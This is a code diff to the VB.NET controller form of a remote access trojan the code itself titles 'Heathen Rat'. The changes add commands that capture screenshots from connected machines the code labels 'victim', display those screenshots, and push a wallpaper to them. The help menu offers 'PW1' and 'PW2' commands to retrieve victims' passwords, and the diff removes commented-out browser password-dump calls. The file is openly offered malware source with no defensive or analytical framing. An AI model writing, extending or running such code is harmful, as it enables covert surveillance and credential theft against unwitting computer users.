@@ -3,6 +3,9 @@ Imports System.Net.Sockets
 Imports System.Threading
 Imports System.Threading.Tasks
 Imports System.Text
+Imports System.IO
+Imports System.Net.NetworkInformation
+
 Public Class Form1
     Dim MonServeur As TcpListener 'Le serveur
     Dim LesClients As List(Of TcpClient) 'Les clients TCP
@@ -10,7 +13,9 @@ Public Class Form1
 
 
 
-
+    Protected Overrides Sub OnPaint(ByVal e As PaintEventArgs)
+        ControlPaint.DrawBorder(e.Graphics, ClientRectangle, Color.DeepSkyBlue, ButtonBorderStyle.Inset)
+    End Sub
     Private Sub Accepter(ByVal Context As TaskScheduler) 'Accepter les clients
         Try
             While (True)
@@ -80,7 +85,7 @@ Public Class Form1
 
 
                     Else
-                        Task.Factory.StartNew(Sub() MessageReçu(LeNom + ": " + Message), CancellationToken.None, TaskCreationOptions.None, context)
+                        Task.Factory.StartNew(Sub() MessageReçu(Message), CancellationToken.None, TaskCreationOptions.None, context)
                     End If
 
                 Else
@@ -95,8 +100,38 @@ Public Class Form1
     End Sub
 
     Private Sub MessageReçu(ByVal leMessage As String)
-        TextBox3.AppendText(leMessage + vbNewLine)
-        RichTextBox1.AppendText(leMessage + vbNewLine)
+        '  TextBox3.AppendText(leMessage + vbNewLine)
+        RichTextBox1.AppendText(leMessage) '+ vbNewLine)
+
+        If RichTextBox1.Text.EndsWith("ILoveScreenShppppt") Then
+
+
+            Dim k As String = RichTextBox1.Text.Replace("ILoveScreenShppppt", "")
+
+            PictureBox2.Image = Base64ToImage(k)
+
+            Dim j As New ScreenForm
+            j.PictureBox1.Image = Base64ToImage(k)
+
+            If ComboBox1.Text = ListView1.SelectedItems(0).ToString Then
+                j.Label1.Text = ComboBox1.Text
+            ElseIf ComboBox1.Text.Length > 0 And ListView1.SelectedItems.Count = 0 Then
+                j.Label1.Text = ComboBox1.Text
+            ElseIf ListView1.SelectedItems.Count > 0 And ComboBox1.Text.Length = 0 Then
+
+                Dim h = ListView1.SelectedItems(0).ToString
+                Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                Dim odd As String = o.Replace("{", "")
+                Dim odd2 As String = odd.Replace("}", "")
+                Dim odd3() As String = Split(odd2, ":")
+
+                lk = odd2
+                j.Label1.Text = "Screenshot from victim : " & lk
+            End If
+            j.Show()
+
+            RichTextBox1.Text = String.Empty
+        End If
 
     End Sub
     Dim lk As String
@@ -116,20 +151,21 @@ Public Class Form1
                 Dim odd As String = o.Replace("{", "")
                 Dim odd2 As String = odd.Replace("}", "")
                 Dim odd3() As String = Split(odd2, ":")
-                '  MessageBox.Show(odd3(0))
-                '     MessageBox.Show(odd3(1))
+
                 lk = odd2
-                '   Dim p As TcpClient(odd3(0), odd3(1))
 
-
-                ' p.GetStream().Write(buffer, 0, buffer.Length)
             Next
 
             For Each client As TcpClient In LesClients
 
                 If lk = client.Client.RemoteEndPoint.ToString Then
                     '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
-                    client.GetStream().Write(buffer, 0, buffer.Length)
+                    Try
+                        client.GetStream().Write(buffer, 0, buffer.Length) '''
+                    Catch ex As Exception
+
+                        MessageBox.Show("The client seems to be offline")
+                    End Try
                 End If
 
             Next
@@ -161,7 +197,12 @@ Public Class Form1
 
                 If lk = client.Client.RemoteEndPoint.ToString Then
                     '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
-                    client.GetStream().Write(buffer, 0, buffer.Length)
+                    Try
+                        client.GetStream().Write(buffer, 0, buffer.Length) '''
+                    Catch ex As Exception
+
+                        MessageBox.Show("The client seems to be offline")
+                    End Try
                 End If
 
             Next
@@ -179,20 +220,21 @@ Public Class Form1
                 Dim odd As String = o.Replace("{", "")
                 Dim odd2 As String = odd.Replace("}", "")
                 Dim odd3() As String = Split(odd2, ":")
-                '  MessageBox.Show(odd3(0))
-                '     MessageBox.Show(odd3(1))
+
                 lk = odd2
-                '   Dim p As TcpClient(odd3(0), odd3(1))
 
-
-                ' p.GetStream().Write(buffer, 0, buffer.Length)
             Next
 
             For Each client As TcpClient In LesClients
 
                 If lk = client.Client.RemoteEndPoint.ToString Then
                     '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
-                    client.GetStream().Write(buffer, 0, buffer.Length)
+                    Try
+                        client.GetStream().Write(buffer, 0, buffer.Length) '''
+                    Catch ex As Exception
+
+                        MessageBox.Show("The client seems to be offline")
+                    End Try
                 End If
 
             Next
@@ -202,11 +244,9 @@ Public Class Form1
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Text = "Hello " + Environment.UserName + " !" + " Welcome to Heathen Rat !"
-        '   Dim o As New StringBuilder
-        '        Plugin.Browsers.Chromium.Chromium.Recovery(o)
-        '    IO.File.WriteAllText("ss.txt", Plugin.Browsers.Chromium.Chromium.Recovery)
-        '   IO.File.WriteAllText("ss2.txt", PW.SteelPassword.Dump)
+
     End Sub
+
 
     Private Sub BunifuButton1_Click(sender As Object, e As EventArgs) Handles BunifuButton1.Click
         BUILDER.Show()
@@ -229,7 +269,7 @@ Public Class Form1
                 BunifuButton2.Text = "Listen"
             End If
         Catch ex As Exception
-            ' MessageBox.Show(ex.Message, "Erreur") 'Message d'erreur
+
         End Try
 
     End Sub
@@ -239,18 +279,14 @@ Public Class Form1
 
             Dim buffer() As Byte = Encoding.UTF8.GetBytes("ITSTIMETOSLEEP")
             For Each h In ListView1.SelectedItems
-                '     MessageBox.Show(h.ToString)
+
                 Dim o As String = h.ToString.Replace("ListViewItem: ", "")
                 Dim odd As String = o.Replace("{", "")
                 Dim odd2 As String = odd.Replace("}", "")
                 Dim odd3() As String = Split(odd2, ":")
-                '  MessageBox.Show(odd3(0))
-                '     MessageBox.Show(odd3(1))
+
                 lk = odd2
-                '   Dim p As TcpClient(odd3(0), odd3(1))
 
-
-                ' p.GetStream().Write(buffer, 0, buffer.Length)
             Next
 
             For Each client As TcpClient In LesClients
@@ -259,8 +295,13 @@ Public Class Form1
                     ComboBox1.Items.Remove(lk)
                     counteur = counteur - 1
                     ListView1.SelectedItems.Item(0).Remove()
-                    '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
-                    client.GetStream().Write(buffer, 0, buffer.Length)
+                    Try
+                        client.GetStream().Write(buffer, 0, buffer.Length) '''
+                    Catch ex As Exception
+
+                        MessageBox.Show("The client seems to be offline")
+                    End Try
+
                 End If
 
             Next
@@ -276,8 +317,13 @@ Public Class Form1
                 For Each client As TcpClient In LesClients
 
                     If ComboBox1.Text = client.Client.RemoteEndPoint.ToString Then
-                        '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
-                        client.GetStream().Write(buffer, 0, buffer.Length)
+
+                        Try
+                            client.GetStream().Write(buffer, 0, buffer.Length) '''
+                        Catch ex As Exception
+
+                            MessageBox.Show("The client seems to be offline")
+                        End Try
                     End If
 
                 Next
@@ -287,40 +333,46 @@ Public Class Form1
                 For Each client As TcpClient In LesClients
 
                     If ComboBox1.Text = client.Client.RemoteEndPoint.ToString Then
-                        '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
-                        client.GetStream().Write(Buffer, 0, Buffer.Length)
+
+                        Try
+                            client.GetStream().Write(buffer, 0, buffer.Length) '''
+                        Catch ex As Exception
+
+                            MessageBox.Show("The client seems to be offline")
+                        End Try
+                    End If
+
+                Next
+
+            Case RichTextBox3.Text = "Take ScreenShot"
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes("TakeAPhotooo561")
+                For Each client As TcpClient In LesClients
+
+                    If ComboBox1.Text = client.Client.RemoteEndPoint.ToString Then
+
+                        Try
+                            client.GetStream().Write(buffer, 0, buffer.Length) '''
+                        Catch ex As Exception
+
+                            MessageBox.Show("The client seems to be offline")
+                        End Try
                     End If
 
                 Next
         End Select
     End Sub
 
-    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
 
-    End Sub
-
-    Private Sub RichTextBox2_TextChanged(sender As Object, e As EventArgs)
-
-    End Sub
-    Private Sub SendCommand(sender As Object, e As KeyEventArgs)
-        'If e.KeyCode = Keys.Enter Then
-        '  Select Case RichTextBox3.Text.Length > 0
-        'Case RichTextBox3.Text = "help"
-        'RichTextBox3.AppendText(Environment.NewLine & "This is help menu")
-        'End Select
-        '  End If
-    End Sub
-
-    Private Sub RichTextBox3_TextChanged(sender As Object, e As EventArgs)
-
-    End Sub
-
+    '-You need to clear command center after each command sent
     Private Sub RichTextBox3_TextChanged_1(sender As Object, e As KeyEventArgs) Handles RichTextBox3.KeyDown
         If e.KeyCode = Keys.Enter Then
             Select Case RichTextBox3.TextLength > 0
                 Case RichTextBox3.Text = "help" Or RichTextBox3.Text = "Help"
                     RichTextBox3.Text = String.Empty
-                    RichTextBox3.AppendText(vbCrLf & vbCrLf & "-This is the help menu" & vbCrLf & vbCrLf & "-Type PW1 to retrieve passwords with method 1" & vbCrLf & vbCrLf & "-Type PW2 to retrieve passwords with method 2" & vbCrLf & vbCrLf & "-You need to clear command center after each command sent")
+                    RichTextBox3.AppendText(vbCrLf & vbCrLf & "- This is the help menu" & vbCrLf &
+                                            vbCrLf & "- Type ""PW1"" to retrieve passwords with method 1" & vbCrLf & vbCrLf & "- Type ""PW2"" to retrieve passwords with method 2" & vbCrLf &
+                                            vbCrLf & "- Type ""Take ScreenShot"" to take a screenshot of desktop victim " & vbCrLf & vbCrLf &
+"- You need to clear command center after each command sent")
                 Case RichTextBox3.Text.Contains("Clear") Or RichTextBox3.Text.Contains("clear")
                     RichTextBox3.Text = String.Empty
             End Select
@@ -330,5 +382,94 @@ Public Class Form1
 
     Private Sub ClearToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearToolStripMenuItem.Click
         RichTextBox3.Text = String.Empty
+    End Sub
+    Public Function Base64ToImage(ByVal base64String As String) As Image
+        ' Convert Base64 String to byte[]
+        Dim imageBytes As Byte() = Convert.FromBase64String(base64String)
+        Dim ms As New MemoryStream(imageBytes, 0, imageBytes.Length)
+
+        ' Convert byte[] to Image
+        ms.Write(imageBytes, 0, imageBytes.Length)
+        Dim ConvertedBase64Image As Image = Image.FromStream(ms, True)
+        Return ConvertedBase64Image
+    End Function
+
+
+    Private Sub TakeScreenShotToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TakeScreenShotToolStripMenuItem.Click
+        If (LesClients.Count > 0) Then
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes("TakeAPhotooo561")
+            For Each h In ListView1.SelectedItems
+
+                Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                Dim odd As String = o.Replace("{", "")
+                Dim odd2 As String = odd.Replace("}", "")
+                Dim odd3() As String = Split(odd2, ":")
+
+                lk = odd2
+
+
+
+
+            Next
+
+            For Each client As TcpClient In LesClients
+
+                If lk = client.Client.RemoteEndPoint.ToString Then
+                    '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
+                    Try
+                        client.GetStream().Write(buffer, 0, buffer.Length) '''
+                    Catch ex As Exception
+
+                        MessageBox.Show("The client seems to be offline")
+                    End Try
+                End If
+
+            Next
+
+        End If
+    End Sub
+
+    Private Sub SetWallpaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SetWallpaperToolStripMenuItem.Click
+        If OpenFileWallpaper.ShowDialog = DialogResult.OK Then
+            If (LesClients.Count > 0) Then
+
+
+                Dim data As String = Convert.ToBase64String(IO.File.ReadAllBytes(OpenFileWallpaper.FileName))
+
+                Dim diff As String = "SetWallpaperGoodSir"
+
+                Dim tot As String = data & diff
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes(tot)
+                For Each h In ListView1.SelectedItems
+
+                    Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                    Dim odd As String = o.Replace("{", "")
+                    Dim odd2 As String = odd.Replace("}", "")
+                    Dim odd3() As String = Split(odd2, ":")
+
+                    lk = odd2
+
+
+
+
+                Next
+
+                For Each client As TcpClient In LesClients
+
+                    If lk = client.Client.RemoteEndPoint.ToString Then
+                        '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
+                        Try
+                            client.GetStream().Write(buffer, 0, buffer.Length) '''
+                        Catch ex As Exception
+
+                            MessageBox.Show("The client seems to be offline")
+                        End Try
+                    End If
+
+                Next
+
+            End If
+        End If
     End Sub
 End Class
